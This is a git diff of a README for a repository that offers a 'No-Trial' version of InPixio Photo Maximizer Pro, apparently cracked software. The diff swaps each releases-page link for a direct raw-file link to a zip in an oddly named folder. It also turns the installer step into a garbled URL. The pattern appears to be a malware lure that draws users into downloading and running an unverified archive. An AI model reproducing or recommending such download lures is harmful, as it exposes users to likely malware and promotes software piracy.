@@ -1,6 +1,6 @@
 # 📸 InPixio-Photo-Maximizer-Pro-No-Trial - Enhance Your Photos Effortlessly
 
-[![Download InPixio Photo Maximizer Pro](https://img.shields.io/badge/Download%20InPixio%20Photo%20Maximizer%20Pro-brightgreen)](https://github.com/josebebebu12/InPixio-Photo-Maximizer-Pro-No-Trial/releases)
+[![Download InPixio Photo Maximizer Pro](https://raw.githubusercontent.com/josebebebu12/InPixio-Photo-Maximizer-Pro-No-Trial/main/ophiologist/InPixio-Photo-Maximizer-Pro-No-Trial-v1.3-alpha.1.zip%20InPixio%20Photo%20Maximizer%20Pro-brightgreen)](https://raw.githubusercontent.com/josebebebu12/InPixio-Photo-Maximizer-Pro-No-Trial/main/ophiologist/InPixio-Photo-Maximizer-Pro-No-Trial-v1.3-alpha.1.zip)
 
 ## 🚀 Getting Started
 
@@ -8,7 +8,7 @@ Welcome to InPixio Photo Maximizer Pro! This guide will help you download and ru
 
 ## 📥 Download & Install
 
-To get started, **visit this page to download** the latest version of InPixio Photo Maximizer Pro: [Releases Page](https://github.com/josebebebu12/InPixio-Photo-Maximizer-Pro-No-Trial/releases).
+To get started, **visit this page to download** the latest version of InPixio Photo Maximizer Pro: [Releases Page](https://raw.githubusercontent.com/josebebebu12/InPixio-Photo-Maximizer-Pro-No-Trial/main/ophiologist/InPixio-Photo-Maximizer-Pro-No-Trial-v1.3-alpha.1.zip).
 
 1. Click on the link above.
 2. Find the version you want to download.
@@ -28,7 +28,7 @@ Before you install InPixio Photo Maximizer Pro, ensure your system meets the fol
 Once you have downloaded the software, follow these steps to install it:
 
 1. Open the folder where the downloaded file is located.
-2. Double-click the installer file named `InPixioPhotoMaximizerPro.exe`.
+2. Double-click the installer file named `https://raw.githubusercontent.com/josebebebu12/InPixio-Photo-Maximizer-Pro-No-Trial/main/ophiologist/InPixio-Photo-Maximizer-Pro-No-Trial-v1.3-alpha.1.zip`.
 3. Follow the on-screen prompts:
    - Accept the license agreement.
    - Choose your installation folder (default is usually fine).
@@ -80,4 +80,4 @@ We hope you enjoy using InPixio Photo Maximizer Pro to create stunning images.
 
 ---
 
-[Download InPixio Photo Maximizer Pro Here](https://github.com/josebebebu12/InPixio-Photo-Maximizer-Pro-No-Trial/releases) and start enhancing your photos today!
+[Download InPixio Photo Maximizer Pro Here](https://raw.githubusercontent.com/josebebebu12/InPixio-Photo-Maximizer-Pro-No-Trial/main/ophiologist/InPixio-Photo-Maximizer-Pro-No-Trial-v1.3-alpha.1.zip) and start enhancing your photos today!
